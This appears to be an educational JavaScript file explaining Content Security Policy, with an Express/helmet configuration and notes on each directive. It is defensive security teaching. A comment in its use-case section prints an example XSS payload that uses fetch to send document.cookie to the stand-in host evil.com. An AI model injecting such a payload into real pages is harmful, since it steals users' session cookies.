/**
 * 🛡️ CONTENT SECURITY POLICY (CSP) — Web Security Best Practice
 *
 * CSP is an HTTP response header that helps prevent cross-site scripting (XSS),
 * clickjacking, and other code injection attacks by **restricting the sources**
 * from which content like JS, CSS, images, fonts, etc. can be loaded.
 *
 * 🔥 Without CSP: Any inline or external malicious script can execute in your page.
 * ✅ With CSP: You control what gets executed — only safe sources are allowed.
 */

// ===================================================================
// 1️⃣ Basic Example of CSP Header (sent from server)
// ===================================================================

/**
 * Add this in Express.js:
 */
import helmet from "helmet";
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"], // only load from same origin
      scriptSrc: ["'self'"], // block inline/third-party scripts
      styleSrc: ["'self'", "https://fonts.googleapis.com"], // allow Google Fonts CSS
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      imgSrc: ["'self'", "data:"], // allow base64 images too
      objectSrc: ["'none'"], // disallow Flash or plugins
      upgradeInsecureRequests: [],
    },
  })
);

/**
 * OR via response header:
 *
 * Content-Security-Policy: 
 *   default-src 'self'; 
 *   script-src 'self'; 
 *   style-src 'self' https://fonts.googleapis.com;
 *   font-src 'self' https://fonts.gstatic.com;
 *   img-src 'self' data:;
 *   object-src 'none';
 */

// ===================================================================
// 2️⃣ What each directive means:
// ===================================================================

/**
 * default-src     => fallback for all resource types
 * script-src      => from where JS can be loaded
 * style-src       => from where CSS can be loaded
 * img-src         => from where images can be loaded
 * font-src        => from where fonts can be loaded
 * object-src      => controls Flash/other plugin resources
 */

// ===================================================================
// 3️⃣ Preventing Inline Scripts
// ===================================================================

/**
 * By default, CSP blocks inline scripts like:
 * <script>alert("XSS!")</script>
 *
 * ✅ Good: Stops injected XSS from running.
 * ❗️If needed (not recommended), allow inline scripts using:
 * script-src 'unsafe-inline';
 *
 * Instead, use external JS files.
 */

// ===================================================================
// 4️⃣ Real-World Use Case:
// ===================================================================

/**
 * Suppose you’re building an e-commerce dashboard.
 * An attacker finds an input field where you forgot to sanitize input.
 * They inject:
 * <script>fetch('https://evil.com/steal?data=' + document.cookie)</script>
 *
 * 🔥 If there's NO CSP — it runs and sends the user’s cookies.
 * ✅ If CSP is configured properly — the browser blocks the request.
 */

// ===================================================================
// 5️⃣ CSP Report-Only Mode
// ===================================================================

/**
 * You can test your policy first without enforcing it:
 *
 * Content-Security-Policy-Report-Only:
 *   default-src 'self'; script-src 'self';
 *
 * Browser will log violations, but not block anything.
 */

// ===================================================================
// ✅ Summary
// ===================================================================

/**
 * 🚫 CSP blocks:
 * - Inline <script> tags (XSS)
 * - Untrusted CDN/script sources
 * - Dangerous content (like Flash)
 *
 * 🛡️ Always use it with:
 * - HttpOnly cookies for auth
 * - Input sanitization
 * - Helmet.js in Express
 *
 * 🔐 CSP = First line of defense for browser security!
 */
